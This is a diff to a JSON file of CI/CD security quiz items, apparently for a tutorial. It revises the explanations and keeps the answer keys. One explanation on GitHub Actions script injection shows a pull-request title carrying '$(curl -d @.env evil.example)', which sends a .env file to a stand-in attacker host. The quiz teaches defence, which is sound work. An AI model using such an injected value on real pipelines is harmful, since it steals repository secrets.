@@ -153,7 +153,7 @@
    "That the job has an image:"
   ],
   "answer": 0,
-  "explain": "stages: at the top of .gitlab-ci.yml lists the stages in the order they run, and each job's stage: must be one of them. A typo like tests instead of test is enough for GitLab to refuse the whole file, before any job runs. The pipeline editor (Build > Pipeline editor) shows such errors as you type."
+  "explain": "stages: at the top of .gitlab-ci.yml lists the stages in the order they run, and each job's stage: must be one of them. A typo like tests instead of test is enough for GitLab to refuse the whole file, before any job runs. The pipeline editor (Build > Pipeline editor) shows such errors as you type. Without stages:, GitLab uses .pre, build, test, deploy, .post, and a job with no stage: goes in test."
  },
  {
   "id": "cicd-1-13",
@@ -179,7 +179,7 @@
    "To save space"
   ],
   "answer": 0,
-  "explain": "uses: some/action@v3 follows a tag, and whoever controls that repository can move the tag to new code, which then runs in your pipeline with your secrets. A commit SHA (the long hexadecimal id) always means exactly the same code. Pin to the SHA and add the version in a comment; Bashou's own CI does this."
+  "explain": "uses: some/action@v3 follows a tag, and whoever controls that repository can move the tag to new code, which then runs in your pipeline with your secrets. A commit SHA (the long hexadecimal id) always means exactly the same code; check it comes from the action's own repository, not a fork. Pin to the SHA and add the version in a comment; Bashou's own CI does this."
  },
  {
   "id": "cicd-2-02",
@@ -205,7 +205,7 @@
    "A parallel deploy"
   ],
   "answer": 0,
-  "explain": "A matrix lists values (Python 3.9 and 3.13, Ubuntu and Rocky…) and the CI runs the same job once for each combination, in parallel. You find out that your code breaks on the oldest supported version before a user does, without copying the job by hand."
+  "explain": "A matrix lists values (Python 3.11 and 3.14, Ubuntu and Rocky…) and the CI runs the same job once for each combination, in parallel. You find out that your code breaks on the oldest supported version before a user does, without copying the job by hand."
  },
  {
   "id": "cicd-2-04",
@@ -348,7 +348,7 @@
    "It only works on the main branch"
   ],
   "answer": 0,
-  "explain": "${{ }} is replaced before the shell runs, so the PR title becomes part of the script: a title like \"; curl evil.example #\" runs that command, with the job's token. Pass untrusted text through env: (TITLE: ${{ github.event.pull_request.title }}) and use \"$TITLE\" in the script: then it stays text."
+  "explain": "${{ }} is replaced before the shell runs, so the PR title becomes part of the script: a title like $(curl -d @.env evil.example) runs even inside the double quotes, with the job's token. Pass untrusted text through env: (TITLE: ${{ github.event.pull_request.title }}) and use \"$TITLE\" in the script: then it stays text."
  },
  {
   "id": "cicd-2-15",
@@ -361,6 +361,6 @@
    "It can't read the repository"
   ],
   "answer": 0,
-  "explain": "pull_request_target runs in your repository's context, with its secrets and a token that can write. Check out the PR's code there and a stranger's fork runs its own code with them. Use pull_request for testing outside code: it gets no secrets and a read-only token. Never check out untrusted code in pull_request_target."
+  "explain": "pull_request_target runs in your repository's context, with its secrets and a token that can write. Check out the PR's code there and a stranger's fork runs its own code with them. Use pull_request to test a fork's code: runs from a fork get no secrets and a read-only token. Never check out untrusted code in pull_request_target."
  }
 ]
